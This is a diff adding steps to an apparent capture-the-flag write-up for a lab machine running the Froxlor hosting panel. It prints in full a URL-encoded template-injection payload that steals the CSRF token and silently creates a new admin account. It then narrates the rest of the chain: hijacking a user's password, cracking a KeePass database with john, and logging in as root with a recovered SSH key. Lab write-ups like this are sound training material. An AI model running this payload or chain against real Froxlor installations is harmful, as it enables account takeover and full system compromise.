@@ -22,3 +22,17 @@ The login page can be bypassed by sending malicious code in login form that will
 To access the paylod you can go to https://github.com/advisories/GHSA-x525-54hf-xr53 and download the payload.
 For this payload to work i changed the address and url encoded it so the result payload looks as followed.
 `admin%7B%7B$emit.constructor%60function+b()%7Bvar+metaTag%253ddocument.querySelector('meta%5Bname%253d%22csrf-token%22%5D')%253bvar+csrfToken%253dmetaTag.getAttribute('content')%253bvar+xhr%253dnew+XMLHttpRequest()%253bvar+url%253d%22http%253a//admin.sightless.htb:8080/admin_admins.php%22%253bvar+params%253d%22new_loginname%253dabcd%2526admin_password%253dAbcd%2540%25401234%2526admin_password_suggestion%253dmgphdKecOu%2526def_language%253den%2526api_allowed%253d0%2526api_allowed%253d1%2526name%253dAbcd%2526email%253dyldrmtest%2540gmail.com%2526custom_notes%253d%2526custom_notes_show%253d0%2526ipaddress%253d-1%2526change_serversettings%253d0%2526change_serversettings%253d1%2526customers%253d0%2526customers_ul%253d1%2526customers_see_all%253d0%2526customers_see_all%253d1%2526domains%253d0%2526domains_ul%253d1%2526caneditphpsettings%253d0%2526caneditphpsettings%253d1%2526diskspace%253d0%2526diskspace_ul%253d1%2526traffic%253d0%2526traffic_ul%253d1%2526subdomains%253d0%2526subdomains_ul%253d1%2526emails%253d0%2526emails_ul%253d1%2526email_accounts%253d0%2526email_accounts_ul%253d1%2526email_forwarders%253d0%2526email_forwarders_ul%253d1%2526ftps%253d0%2526ftps_ul%253d1%2526mysqls%253d0%2526mysqls_ul%253d1%2526csrf_token%253d%22%252bcsrfToken%252b%22%2526page%253dadmins%2526action%253dadd%2526send%253dsend%22%253bxhr.open(%22POST%22,url,true)%253bxhr.setRequestHeader(%22Content-type%22,%22application/x-www-form-urlencoded%22)%253balert(%22Your+Froxlor+Application+has+been+completely+Hacked%22)%253bxhr.send(params)%7D%253ba%253db()%60()%7D%7D`
+I then intercepted the request in Burp Suite and got code 302 which means the payload went through successfully.
+The deafult credentials in payload are user : `abcd`  pass: `Abcd@@1234`.
+Now i logged in with these into the froxlor amdin panel.
+I discovered web1 user and i could change his password so i did. 
+This allowed me to connect to ftp using filezill as web1 with my newly setup password.
+Inside i discovered the databas.kdb file which i downlaoded.
+Database is inaccessible withtout the key but can be cracked.
+To do so i used `keepass2john` tool to create hash from the database.
+Then i cracked the hash using john.
+I connected to the database with the database file and password using the kpcli.
+Inside the database there was an ssh backup file with root and password.
+However the password did not work. Luckily there was id_rsa.
+Which is rsa key that allows to login without the password.
+I downloaded this file had to use dos2unix to format spaces correctly and Successfully connected as a root.
